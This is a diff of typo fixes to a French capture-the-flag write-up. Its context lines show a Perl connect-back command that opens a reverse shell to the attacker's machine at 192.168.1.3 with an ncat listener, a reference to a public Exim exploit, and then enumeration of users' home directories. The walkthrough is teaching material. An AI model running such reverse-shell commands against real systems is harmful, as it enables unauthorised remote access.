@@ -140,13 +140,13 @@ Maintenant, ce serait bien d'avoir un shell, même s'il est basique. Alors on u
 perl dc.pl 192.168.1.3 9999
 ```
 
-Au préalable sur notre machine (192.168.1.3) au aura mis un port en écoute avec `ncat` (ou `netcat` pour les vieux :D)  
+Au préalable sur notre machine (192.168.1.3) on aura mis un port en écoute avec `ncat` (ou `netcat` pour les vieux :D)  
 
 ![Connect-back shell](/assets/img/xerxes3.png)
 
 Dans les processus, on remarque qu'un *Exim* tourne. Les abonnés à *Full-Disclosure* se rappellent peut être qu'un exploit avait été écrit par *KingCope* mais après avoir testé [l'exploit](http://www.securityfocus.com/bid/45341/exploit), il semble que l'on ne soit pas dans la bonne direction.  
 
-On ne trouve rien d'intéressant dans la `crontab` ou dans les ports en écoute.  
+On ne trouve rien d'intéressant dans la `crontab` ou dans les ports en écoute.  
 
 Dans le `/home` on trouve 3 utilisateurs :
 
@@ -158,7 +158,7 @@ drwxr-x--- 3 curtiz    curtiz    4096 Dec 20 06:18 curtiz
 drwxr-x--- 3 delacroix delacroix 4096 Dec 24 01:34 delacroix
 ```
 
-Avec nos droits courants, seul le dossier `amanpour` peut nous intéresser. Voici le contenu de son dossier :
+Avec nos droits courants, seul le dossier `amanpour` peut nous intéresser. Voici le contenu de son dossier :
 
 ```
 -rwxr--r-- 1 amanpour amanpour  270 Dec 19 01:28 .bash_history
